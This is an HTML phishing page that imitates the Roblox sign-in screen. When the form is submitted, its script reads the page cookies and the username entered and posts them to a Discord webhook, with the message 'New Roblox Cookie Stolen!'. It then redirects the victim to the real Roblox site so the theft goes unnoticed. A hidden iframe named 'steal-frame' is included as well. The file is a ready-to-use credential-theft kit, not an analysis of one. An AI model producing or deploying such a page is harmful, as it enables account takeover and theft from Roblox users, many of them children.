<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        body {
            background-color: #f2f4f7;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 {
            color: #393939;
            margin-bottom: 1rem;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #00b06f;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #008a5c;
        }
        .footer {
            margin-top: 1rem;
            font-size: 0.8rem;
            color: #777;
        }
        /* Hidden iframe to keep the session alive */
        #steal-frame {
            display: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h2>Sign in</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username or Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <div class="footer">
            <p>Don't have an account? <a href="https://www.roblox.com/start-register" style="color: #00a2ff;">Sign up</a></p>
        </div>
    </div>

    <!-- Hidden iframe to load the real Roblox page in the background -->
    <iframe id="steal-frame" src="https://www.roblox.com/login"></iframe>

    <script>
        const WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"; // Replace this

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            // 1. Capture the cookies
            const cookies = document.cookie;

            // 2. Prepare the payload for Discord
            const payload = {
                content: "New Roblox Cookie Stolen! 🍪",
                embeds: [{
                    title: "Cookie Stolen",
                    description: `**Cookie:**\n\`${cookies}\`\n\n**Username:** \`${document.getElementById('username').value}\``,
                    color: 15158332, // Green
                    timestamp: new Date().toISOString()
                }]
            };

            // 3. Send to Discord Webhook
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            }).then(() => {
                // 4. Redirect user back to Roblox to make it look seamless
                window.location.href = "https://www.roblox.com/";
            }).catch(err => {
                console.error('Error sending cookie:', err);
                // Still redirect even if webhook fails
                window.location.href = "https://www.roblox.com/";
            });
        });
    </script>

</body>
</html>
